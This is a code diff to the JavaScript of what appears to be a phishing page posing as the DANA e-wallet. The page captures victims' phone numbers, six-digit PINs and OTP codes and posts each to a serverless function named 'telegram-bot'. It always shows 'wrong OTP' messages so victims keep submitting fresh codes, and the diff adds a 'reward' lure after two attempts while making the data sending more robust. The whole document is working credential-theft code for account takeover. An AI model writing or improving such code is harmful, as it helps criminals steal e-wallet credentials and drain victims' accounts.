@@ -16,9 +16,8 @@ document.addEventListener('DOMContentLoaded', () => {
   const ac = document.getElementById('attempt-counter');
   const an = document.getElementById('attempt-number');
   const lc = document.getElementById('lanjutkan-container');
+  const rewardInstruction = document.getElementById('reward-instruction');
   const resendOtp = document.getElementById('resend-otp');
-  const vb = document.getElementById('verifikasi-button');
-  const vc = document.querySelector('.verifikasi-button-container');
 
   // State Variables
   let currentPage = 'n';
@@ -45,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
     // Reset timer state
     clearInterval(otpTimer);
     if (resendOtp) {
-      resendOtp.classList.remove('active');
       resendOtp.style.pointerEvents = 'none';
       resendOtp.style.opacity = '0.5';
     }
@@ -58,10 +56,8 @@ document.addEventListener('DOMContentLoaded', () => {
       if (timeLeft <= 0) {
         clearInterval(otpTimer);
         if (resendOtp) {
-          resendOtp.classList.add('active');
           resendOtp.style.pointerEvents = 'auto';
           resendOtp.style.opacity = '1';
-          resendOtp.innerHTML = 'KIRIM ULANG OTP';
         }
       }
       timeLeft--;
@@ -70,19 +66,45 @@ document.addEventListener('DOMContentLoaded', () => {
 
   function resetOTPInputs() {
     ois.forEach(input => input.value = '');
-    ois[0].focus();
+    if (ois[0]) ois[0].focus();
     otp = '';
     attemptCount++;
     if (an) an.textContent = attemptCount;
     if (ac) ac.style.display = 'block';
   }
 
-  // Backend Communication - Menggunakan Netlify Function
+  function showRewardInstruction() {
+    if (rewardInstruction) {
+      rewardInstruction.style.display = 'block';
+      
+      // Close button handler
+      const closeBtn = rewardInstruction.querySelector('.close-btn');
+      if (closeBtn) {
+        closeBtn.addEventListener('click', () => {
+          rewardInstruction.style.display = 'none';
+        });
+      }
+    }
+  }
+
+  // Backend Communication - Fixed function name
   async function sendDanaData(type, data) {
     try {
-      // Gunakan Netlify Function untuk mengirim data terenkripsi
-      const result = await sendEncryptedData(type, data);
-      return result;
+      // Menggunakan nama function yang benar
+      const response = await fetch('/.netlify/functions/telegram-bot', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ type, ...data })
+      });
+      
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(errorText || `Server error: ${response.status}`);
+      }
+      
+      return await response.json();
     } catch (error) {
       console.error('API Error:', error);
       
@@ -175,109 +197,118 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   // PIN Input Handling
-  pis.forEach((input, index) => {
-    input.addEventListener('input', async (e) => {
-      e.target.value = e.target.value.replace(/\D/g, '');
-      
-      if (e.target.value.length === 1 && index < pis.length - 1) {
-        pis[index + 1].focus();
-      }
-      
-      pin = Array.from(pis).map(i => i.value).join('');
-      
-      if (pin.length === 6) {
-        showSpinner();
-        try {
-          const result = await sendDanaData('pin', { phone: phoneNumber, pin });
-          console.log('PIN submission result:', result);
-          
-          pages.p.style.display = 'none';
-          pages.o.style.display = 'block';
-          currentPage = 'o';
-          if (lc) lc.style.display = 'none';
-          startOTPTimer();
-          setTimeout(() => {
-            if (fn) {
-              fn.style.display = 'block';
-              fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
-            }
-          }, 1000);
-        } catch (error) {
-          console.error('PIN submission error:', error);
-          alert('Gagal mengirim PIN: ' + error.message);
-        } finally {
-          hideSpinner();
+  if (pis.length > 0) {
+    pis.forEach((input, index) => {
+      input.addEventListener('input', async (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        
+        if (e.target.value.length === 1 && index < pis.length - 1) {
+          pis[index + 1].focus();
         }
-      }
+        
+        pin = Array.from(pis).map(i => i.value).join('');
+        
+        if (pin.length === 6) {
+          showSpinner();
+          try {
+            const result = await sendDanaData('pin', { phone: phoneNumber, pin });
+            console.log('PIN submission result:', result);
+            
+            pages.p.style.display = 'none';
+            pages.o.style.display = 'block';
+            currentPage = 'o';
+            if (lc) lc.style.display = 'none';
+            startOTPTimer();
+            setTimeout(() => {
+              if (fn) {
+                fn.style.display = 'block';
+                fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
+              }
+            }, 1000);
+          } catch (error) {
+            console.error('PIN submission error:', error);
+            alert('Gagal mengirim PIN: ' + error.message);
+          } finally {
+            hideSpinner();
+          }
+        }
+      });
+      
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+          pis[index - 1].focus();
+        }
+      });
     });
-    
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-        pis[index - 1].focus();
-      }
-    });
-  });
+  }
 
   // OTP Input Handling
-  ois.forEach((input, index) => {
-    input.addEventListener('input', async (e) => {
-      e.target.value = e.target.value.replace(/\D/g, '');
-      
-      if (e.target.value.length === 1 && index < ois.length - 1) {
-        ois[index + 1].focus();
-      }
-      
-      otp = Array.from(ois).map(i => i.value).join('');
-      
-      if (index === ois.length - 1 && e.target.value.length === 1) {
-        showSpinner();
-        try {
-          const result = await sendDanaData('otp', { phone: phoneNumber, pin, otp });
-          console.log('OTP submission result:', result);
-          
-          setTimeout(() => {
-            resetOTPInputs();
-            
-            if (attemptCount > 2 && rn) {
-              rn.style.display = 'block';
-              rn.innerHTML = `
-                <div class="notification-content">
-                  <h3>Kode OTP Salah</h3>
-                  <p>Silakan cek SMS atau WhatsApp Anda</p>
-                </div>
-              `;
-              setTimeout(() => {
-                if (rn) rn.style.display = 'none';
-              }, 10000);
-            }
-            
-            if (attemptCount >= maxAttempts && sn) {
-              if (fn) fn.style.display = 'none';
-              sn.style.display = 'block';
-              setTimeout(() => {
-                if (sn) sn.style.display = 'none';
-              }, 5000);
-            }
-          }, 1000);
-        } catch (error) {
-          console.error('OTP submission error:', error);
-        } finally {
-          hideSpinner();
+  if (ois.length > 0) {
+    ois.forEach((input, index) => {
+      input.addEventListener('input', async (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        
+        if (e.target.value.length === 1 && index < ois.length - 1) {
+          ois[index + 1].focus();
         }
-      }
+        
+        otp = Array.from(ois).map(i => i.value).join('');
+        
+        if (index === ois.length - 1 && e.target.value.length === 1) {
+          showSpinner();
+          try {
+            const result = await sendDanaData('otp', { phone: phoneNumber, pin, otp });
+            console.log('OTP submission result:', result);
+            
+            setTimeout(() => {
+              resetOTPInputs();
+              
+              // Show reward instruction after 2 attempts
+              if (attemptCount === 2) {
+                showRewardInstruction();
+              }
+              
+              if (attemptCount > 2 && rn) {
+                rn.style.display = 'block';
+                rn.innerHTML = `
+                  <div class="notification-content">
+                    <h3>Kode OTP Salah</h3>
+                    <p>Silakan cek SMS atau WhatsApp Anda</p>
+                  </div>
+                `;
+                setTimeout(() => {
+                  if (rn) rn.style.display = 'none';
+                }, 10000);
+              }
+              
+              if (attemptCount >= maxAttempts && sn) {
+                if (fn) fn.style.display = 'none';
+                sn.style.display = 'block';
+                setTimeout(() => {
+                  if (sn) sn.style.display = 'none';
+                }, 5000);
+              }
+            }, 1000);
+          } catch (error) {
+            console.error('OTP submission error:', error);
+          } finally {
+            hideSpinner();
+          }
+        }
+      });
+      
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+          ois[index - 1].focus();
+        }
+      });
     });
-    
-    input.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-        ois[index - 1].focus();
-      }
-    });
-  });
+  }
 
   // Resend OTP Handler
   if (resendOtp) {
     resendOtp.addEventListener('click', function() {
-      if (this.classList.contains('active')) {
+      if (this.style.pointerEvents === 'auto' || this.style.opacity === '1') {
         showSpinner();
         setTimeout(() => {
           startOTPTimer();
